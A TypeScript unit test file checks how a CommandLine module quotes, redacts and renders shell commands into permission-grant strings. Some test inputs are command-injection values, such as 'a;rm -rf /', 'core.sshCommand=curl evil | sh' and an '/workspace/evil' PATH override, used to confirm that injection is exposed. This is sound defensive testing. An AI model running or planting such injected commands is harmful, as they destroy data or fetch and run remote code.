/**
 * `CommandLine.render` is the string a `proc:spawn` grant is written against
 * and the line the browser interpreter actually runs. Those two must never
 * disagree, so the rendering rules get their own cases.
 */
import * as ChildProcess from "effect/process/ChildProcess"
import * as Redacted from "effect/Redacted"
import { describe, expect, it } from "vitest"
import * as CommandLine from "../src/CommandLine.ts"

describe("CommandLine.render", () => {
  it("leaves a bare command and shell-safe arguments unquoted", () => {
    expect(CommandLine.render(ChildProcess.make("git", ["status", "--short"]))).toBe("git status --short")
    expect(CommandLine.render(ChildProcess.make("/usr/bin/curl", ["https://example.com/a?b"])))
      .toBe("/usr/bin/curl 'https://example.com/a?b'")
  })

  it("single-quotes anything with whitespace, an empty argument, or a metacharacter", () => {
    expect(CommandLine.render(ChildProcess.make("echo", ["a b"]))).toBe("echo 'a b'")
    expect(CommandLine.render(ChildProcess.make("echo", [""]))).toBe("echo ''")
    expect(CommandLine.render(ChildProcess.make("echo", ["a;rm -rf /"]))).toBe("echo 'a;rm -rf /'")
  })

  it("escapes an embedded single quote so the rendering cannot break out of it", () => {
    expect(CommandLine.render(ChildProcess.make("echo", ["it's"]))).toBe("echo 'it'\\''s'")
  })

  it("preserves newline and NUL tokens in the durable grant identity", () => {
    const newline = "line\nbreak"
    expect(CommandLine.quote(newline)).toBe("'line\nbreak'")
    expect(CommandLine.render(ChildProcess.make("echo", [newline]))).toBe("echo 'line\nbreak'")

    const nul = "nul\0byte"
    expect(CommandLine.quote(nul)).toBe("'nul\0byte'")
    expect(CommandLine.render(ChildProcess.make("echo", [nul]))).toBe("echo 'nul\0byte'")
  })

  it("keeps a backslash literal inside the quoted rendering", () => {
    expect(CommandLine.quote("a\\b")).toBe("'a\\b'")
    expect(CommandLine.render(ChildProcess.make("echo", ["C:\\Windows\\system32"])))
      .toBe("echo 'C:\\Windows\\system32'")
    // A backslash adjacent to the escaped single quote must not swallow it:
    // the token `a\'b` has to survive a round trip through the shell.
    expect(CommandLine.quote("a\\'b")).toBe("'a\\'\\''b'")
  })

  it("quotes non-ASCII tokens so a lookalike never renders as a bare safe token", () => {
    expect(CommandLine.quote("café")).toBe("'café'")
    // U+FF47 FULLWIDTH LATIN SMALL LETTER G is not `g`, so `\uFF47it` must not
    // render as the bare `git` a reviewer would read it as.
    expect(CommandLine.quote("\uFF47it")).toBe("'\uFF47it'")
    expect(CommandLine.render(ChildProcess.make("echo", ["→", "\u200b"])))
      .toBe("echo '→' '\u200b'")
  })

  it("renders shell commands verbatim so the capability names what executes", () => {
    expect(CommandLine.render(ChildProcess.make("echo", ["safe; touch /tmp/marker"], { shell: true })))
      .toBe("echo safe; touch /tmp/marker")
    expect(CommandLine.render(ChildProcess.make("echo", ["a b"], { shell: "/bin/sh" })))
      .toBe("/bin/sh -c 'echo a b'")
    expect(CommandLine.render(ChildProcess.make("echo", ["it's"], { shell: "/custom shell" })))
      .toBe("'/custom shell' -c 'echo it'\\''s'")
    expect(CommandLine.render(ChildProcess.make("echo", ["a b"], { shell: false })))
      .toBe("echo 'a b'")
  })

  it("renders a pipeline with `|` between its stages", () => {
    const pipeline = ChildProcess.make("printf", ["a b"]).pipe(
      ChildProcess.pipeTo(ChildProcess.make("grep", ["a"]))
    )

    expect(CommandLine.render(pipeline)).toBe("printf 'a b' | grep a")
  })

  it("renders shell and custom-shell stages independently inside a pipeline", () => {
    const pipeline = ChildProcess.make("printf", ["safe; printf injected"], { shell: true }).pipe(
      ChildProcess.pipeTo(ChildProcess.make("grep", ["hello world"], { shell: "/custom shell" }))
    )

    expect(CommandLine.render(pipeline)).toBe(
      "printf safe; printf injected | '/custom shell' -c 'grep hello world'"
    )
  })

  it("keeps pipe descriptor options out of the capability resource at the fd3 boundary", () => {
    const defaultPipe = ChildProcess.pipeTo(ChildProcess.make("left"), ChildProcess.make("right"))
    const minimumCustomFd = ChildProcess.pipeTo(
      ChildProcess.make("left"),
      ChildProcess.make("right"),
      { from: "fd3", to: "fd3" }
    )
    const belowMinimumFd = ChildProcess.pipeTo(
      ChildProcess.make("left"),
      ChildProcess.make("right"),
      {
        from: "fd2" as unknown as ChildProcess.PipeFromOption,
        to: "fd2" as unknown as ChildProcess.PipeToOption
      }
    )

    expect(CommandLine.render(defaultPipe)).toBe("left | right")
    expect(CommandLine.render(minimumCustomFd)).toBe("left | right")
    expect(CommandLine.render(belowMinimumFd)).toBe("left | right")
  })
})

describe("CommandLine.executable", () => {
  it("drops the arguments, which are where a credential rides", () => {
    expect(CommandLine.executable(ChildProcess.make("curl", ["-u", "user:password"]))).toBe("curl")
    expect(CommandLine.executable(ChildProcess.make("mysql", ["-phunter2"], { shell: false }))).toBe("mysql")
  })

  it("keeps an executable path whole, spaces included, when no shell parses it", () => {
    expect(CommandLine.executable(ChildProcess.make("/opt/My Agent/bin/agent", ["--token", "hunter2"])))
      .toBe("/opt/My Agent/bin/agent")
  })

  it("takes the leading token of a shell line, where the arguments are part of the command", () => {
    expect(CommandLine.executable(ChildProcess.make("mysql -phunter2", [], { shell: true }))).toBe("mysql")
    expect(CommandLine.executable(ChildProcess.make("  curl -u user:password", [], { shell: true }))).toBe("curl")
    expect(CommandLine.executable(ChildProcess.make("agent", ["--token", "hunter2"], { shell: true }))).toBe("agent")
    expect(CommandLine.executable(ChildProcess.make("mysql -phunter2", [], { shell: "/bin/zsh" }))).toBe("mysql")
  })

  it("skips leading assignments, which carry credentials, and unquotes the program", () => {
    const shell = (line: string) => CommandLine.executable(ChildProcess.make(line, [], { shell: true }))
    expect(shell("PGPASSWORD=hunter2 psql -h db")).toBe("psql")
    expect(shell("A='x y' B=\"p q\" C=a\\ b D= psql")).toBe("psql")
    expect(shell("TOKEN=\"$(cat key) x\" curl")).toBe("curl")
    expect(shell("'/opt/my tool/bin' --x")).toBe("/opt/my tool/bin")
    expect(shell("\"/opt/my tool\"/bin --x")).toBe("/opt/my tool/bin")
  })

  it("names the shell when the program is not a plain word", () => {
    const shell = (line: string) => CommandLine.executable(ChildProcess.make(line, [], { shell: true }))
    expect(shell("$TOOL --token hunter2")).toBe("sh")
    expect(shell("PASS=$(printf hunter2 ) psql")).toBe("sh")
    expect(shell("PASS=hunter2; psql")).toBe("sh")
    expect(shell("/opt/my\\ tool --x")).toBe("sh")
    expect(shell("\"$HOME/bin/tool\" --x")).toBe("sh")
    expect(shell("PGPASSWORD=hunter2")).toBe("sh")
    expect(shell("")).toBe("sh")
  })

  it("names one executable per pipeline stage", () => {
    const pipeline = ChildProcess.make("printf", ["a\nb\n"]).pipe(
      ChildProcess.pipeTo(ChildProcess.make("grep -e secret", [], { shell: true }))
    )

    expect(CommandLine.executable(pipeline)).toBe("printf | grep")
  })
})

describe("CommandLine.cwd and CommandLine.env", () => {
  it("reads the options off a standard command", () => {
    const command = ChildProcess.make("ls", [], { cwd: "/work", env: { A: "1" } })

    expect(CommandLine.cwd(command)).toBe("/work")
    expect(CommandLine.env(command)).toEqual({ A: "1" })
  })

  it("is undefined when a command declares neither", () => {
    expect(CommandLine.cwd(ChildProcess.make("ls"))).toBeUndefined()
    expect(CommandLine.env(ChildProcess.make("ls"))).toBeUndefined()
  })

  it("takes the leftmost stage of a pipeline", () => {
    const pipeline = ChildProcess.make("ls", [], { cwd: "/left", env: { SIDE: "left" } }).pipe(
      ChildProcess.pipeTo(ChildProcess.make("wc", [], { cwd: "/right", env: { SIDE: "right" } }))
    )

    expect(CommandLine.cwd(pipeline)).toBe("/left")
    expect(CommandLine.env(pipeline)).toEqual({ SIDE: "left" })
  })
})

describe("CommandLine.resource", () => {
  it("fingerprints a protected argument so one grant binds one hidden value", () => {
    const resource = (secret: string, context?: CommandLine.ResourceContext) =>
      CommandLine.resource(ChildProcess.make("git", ["-c", Redacted.make(secret), "fetch"]), context)
    const approved = resource("user.name=x")
    expect(approved).toMatch(/^git -c '<redacted:[0-9a-f]{16}>' fetch$/)
    expect(resource("user.name=x")).toBe(approved)
    expect(resource("core.sshCommand=curl evil | sh")).not.toBe(approved)
    expect(resource("user.name=x", { redactionKey: new Uint8Array([1]) })).not.toBe(approved)
    expect(approved).not.toContain("user.name")
  })

  it("fingerprints with HMAC-SHA256 under the redaction key (RFC 4231 cases 2 and 6)", () => {
    const fingerprint = (key: Uint8Array, value: string) =>
      CommandLine.resource(ChildProcess.make("x", [Redacted.make(value)]), { redactionKey: key })
    expect(fingerprint(new TextEncoder().encode("Jefe"), "what do ya want for nothing?"))
      .toBe("x '<redacted:5bdcc146bf60754e>'")
    expect(fingerprint(new Uint8Array(131).fill(0xaa), "Test Using Larger Than Block-Size Key - Hash Key First"))
      .toBe("x '<redacted:60e431591ee0b67f>'")
  })

  it("equals the rendered line for argv commands and simple shell lines", () => {
    expect(CommandLine.resource(ChildProcess.make("git", ["status", "a;b"]))).toBe("git status 'a;b'")
    expect(CommandLine.resource(ChildProcess.make("git status --short", { shell: true }))).toBe("git status --short")
    expect(CommandLine.resource(ChildProcess.make("echo", ["a b"], { shell: "/bin/sh" })))
      .toBe("/bin/sh -c 'echo a b'")
  })

  it("marks a shell line holding control syntax as the explicit sh -c it runs", () => {
    for (const operator of [";", "&", "|", "`", "$", "<", ">", "(", ")", "\n", "\r"]) {
      const line = `git status ${operator} id`
      expect(CommandLine.resource(ChildProcess.make(line, { shell: true }))).toBe(`sh -c ${CommandLine.quote(line)}`)
    }
  })

  it("keeps fd duplications and discards to /dev/null out of the control syntax", () => {
    for (const line of ["git status 2>&1", "git status >&2", "git status 2>/dev/null", "git status > /dev/null 2>&1"]) {
      expect(CommandLine.resource(ChildProcess.make(line, { shell: true })), line).toBe(line)
    }
    for (
      const line of [
        "git status 2>&1; id",
        "git status 2>&1-",
        "git status 2>/dev/nullx",
        "git status >& file",
        "git status > out",
        "git status 2>&1 | sh",
        "git status >\n/dev/null",
        "git status 2>\r/dev/null"
      ]
    ) {
      expect(CommandLine.resource(ChildProcess.make(line, { shell: true })), line).toBe(
        `sh -c ${CommandLine.quote(line)}`
      )
    }
  })

  it("names environment overrides the child would not inherit, never their values", () => {
    const command = ChildProcess.make("git", ["fetch"], {
      env: { PATH: "/bin", HOME: "/h", LC_ALL: "C", NODE_OPTIONS: "--require x", GIT_SSH_COMMAND: "s", GONE: undefined }
    })
    const ambient = { PATH: "/bin", HOME: "/h", LC_ALL: "C" }
    expect(CommandLine.resource(command, { ambient })).toBe("env GIT_SSH_COMMAND NODE_OPTIONS -- git fetch")
    expect(CommandLine.resource(ChildProcess.make("git", [], { env: { PATH: "/bin" } }), { ambient })).toBe("git")
  })

  it("names a bootstrap override whose value differs from the ambient one", () => {
    const command = ChildProcess.make("git", ["status"], { env: { PATH: "/workspace/evil:/bin", HOME: "/h" } })
    expect(CommandLine.resource(command, { ambient: { PATH: "/bin", HOME: "/h" } })).toBe("env PATH -- git status")
    expect(CommandLine.resource(command, { ambient: { PATH: "/bin" } })).toBe("env HOME PATH -- git status")
    expect(CommandLine.resource(command)).toBe("env HOME PATH -- git status")
  })

  it("names a working directory the context does not contain", () => {
    const command = ChildProcess.make("git", ["status"], { cwd: "/tmp/other repo" })
    expect(CommandLine.resource(command)).toBe("cwd '/tmp/other repo' -- git status")
    expect(CommandLine.resource(command, { contains: () => false })).toBe("cwd '/tmp/other repo' -- git status")
    expect(CommandLine.resource(command, { contains: () => true })).toBe("git status")
    expect(
      CommandLine.resource(
        ChildProcess.make("git", ["status"], { cwd: "/elsewhere", env: { GIT_DIR: "x" } }),
        { contains: () => false }
      )
    ).toBe("cwd /elsewhere -- env GIT_DIR -- git status")
  })

  it("renders a literal env or cwd command like the prefix it aliases", () => {
    // Pinned aliasing: the literal command runs a program named PATH or cwd,
    // never git, so a grant for the prefixed resource admits nothing more.
    const overridden = ChildProcess.make("git", ["status"], { env: { PATH: "/evil" } })
    expect(CommandLine.resource(ChildProcess.make("env", ["PATH", "--", "git", "status"]), { ambient: {} })).toBe(
      CommandLine.resource(overridden, { ambient: { PATH: "/bin" } })
    )
    expect(CommandLine.resource(ChildProcess.make("cwd", ["/elsewhere", "--", "git", "status"]))).toBe(
      CommandLine.resource(ChildProcess.make("git", ["status"], { cwd: "/elsewhere" }))
    )
  })

  it("lists every pipeline stage from left to right", () => {
    const first = ChildProcess.make("git", ["log"])
    const second = ChildProcess.make("grep a; id", { shell: true })
    const third = ChildProcess.make("wc")
    expect(CommandLine.stages(first)).toEqual([first])
    expect(CommandLine.stages(first.pipe(ChildProcess.pipeTo(second), ChildProcess.pipeTo(third)))).toEqual([
      first,
      second,
      third
    ])
  })
})

it("reveals protected arguments only when rendering for an interpreter", () => {
  const standard = ChildProcess.make("printf", [Redacted.make("secret value")])
  expect(CommandLine.render(standard)).toBe("printf '<redacted>'")
  expect(CommandLine.renderForExecution(standard)).toBe("printf 'secret value'")
  expect(CommandLine.renderForExecution(ChildProcess.make("printf", ["plain value"]))).toBe("printf 'plain value'")
  expect(CommandLine.renderForExecution(ChildProcess.make("echo", [Redacted.make("a b")], { shell: true })))
    .toBe("echo a b")
  expect(CommandLine.renderForExecution(ChildProcess.make("echo", [Redacted.make("a b")], { shell: "/bin/sh" })))
    .toBe("/bin/sh -c 'echo a b'")
  const pipeline = standard.pipe(ChildProcess.pipeTo(ChildProcess.make("grep", [Redacted.make("value")])))
  expect(CommandLine.renderForExecution(pipeline)).toBe("printf 'secret value' | grep value")
  expect(CommandLine.render(pipeline)).not.toContain("secret")
})
